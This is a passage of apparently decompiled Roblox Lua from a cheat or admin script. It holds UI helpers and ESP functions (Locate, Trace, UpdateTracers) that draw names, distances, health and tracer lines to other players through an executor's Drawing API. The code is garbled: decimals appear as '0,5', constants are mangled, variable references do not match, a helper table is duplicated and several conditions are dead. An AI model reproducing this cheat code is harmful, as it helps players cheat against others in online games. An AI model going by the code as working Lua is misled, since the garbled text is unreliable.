                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Save, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
